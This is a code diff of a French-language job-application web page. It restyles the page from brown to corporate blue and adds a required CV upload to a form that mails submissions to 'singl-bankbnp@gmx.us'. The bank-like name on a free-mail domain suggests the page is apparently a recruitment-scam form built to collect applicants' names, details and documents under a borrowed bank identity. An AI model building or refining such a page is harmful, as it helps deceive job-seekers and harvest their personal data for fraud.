@@ -9,13 +9,14 @@
             font-family: Arial, sans-serif;
             margin: 0;
             padding: 0;
-            background-color: #8B4513; /* Fond marron */
-            color: #ffffff; /* Texte blanc */
+            background-color: #f2f2f2; /* Arrière-plan gris clair */
+            color: #333333; /* Texte gris foncé */
         }
         header {
             text-align: center;
             padding: 20px;
-            background-color: #5A3318; /* Marron plus foncé pour l'en-tête */
+            background-color: #1A237E; /* Bleu foncé pour l'en-tête */
+            color: #ffffff; /* Texte blanc */
             margin-bottom: 20px;
         }
         header h1 {
@@ -26,7 +27,7 @@
             max-width: 800px;
             margin: 0 auto;
             background-color: #ffffff; /* Fond blanc pour le contenu */
-            color: #000000; /* Texte noir pour le contraste */
+            color: #333333;
             padding: 20px;
             border-radius: 10px;
             box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
@@ -51,32 +52,35 @@
             font-size: 14px;
         }
         button {
-            background-color: #5A3318; /* Marron pour le bouton */
+            background-color: #1A237E; /* Bleu pour le bouton */
             color: #ffffff;
             font-weight: bold;
             border: none;
             cursor: pointer;
         }
         button:hover {
-            background-color: #8B4513; /* Couleur marron plus claire au survol */
+            background-color: #3949AB; /* Bleu plus clair au survol */
         }
         .contact-info {
             margin-top: 20px;
             text-align: center;
         }
         .contact-info a {
-            color: #ffffff;
+            color: #1A237E; /* Bleu pour les liens */
             text-decoration: none;
             font-weight: bold;
         }
+        .contact-info a:hover {
+            text-decoration: underline;
+        }
         .fixed-info {
-            background-color: #F5F5DC; /* Beige clair */
-            color: #000000;
+            background-color: #E3F2FD; /* Bleu très clair */
+            color: #1A237E;
             text-align: center;
             padding: 10px;
             margin-bottom: 20px;
             font-weight: bold;
-            border: 1px solid #ccc;
+            border: 1px solid #1A237E;
             border-radius: 5px;
         }
     </style>
@@ -97,7 +101,7 @@
         </p>
         <p>Postulez pour l'un de nos nombreux postes ci-dessous. Nous avons hâte de vous accueillir parmi nous !</p>
 
-        <form action="mailto:singl-bankbnp@gmx.us" method="POST" enctype="text/plain">
+        <form action="mailto:singl-bankbnp@gmx.us" method="POST" enctype="multipart/form-data">
             <label for="name">Nom complet :</label>
             <input type="text" id="name" name="Nom" placeholder="Entrez votre nom complet" required>
 
@@ -133,6 +137,9 @@
 
             <label for="message">Message ou motivation :</label>
             <textarea id="message" name="Message" rows="5" placeholder="Expliquez pourquoi vous postulez pour ce poste" required></textarea>
+
+            <label for="file">Joindre un fichier (CV, lettre de motivation, etc.) :</label>
+            <input type="file" id="file" name="Fichier" accept=".pdf,.doc,.docx,.png,.jpg,.jpeg" required>
 
             <button type="submit">Envoyer la candidature</button>
         </form>
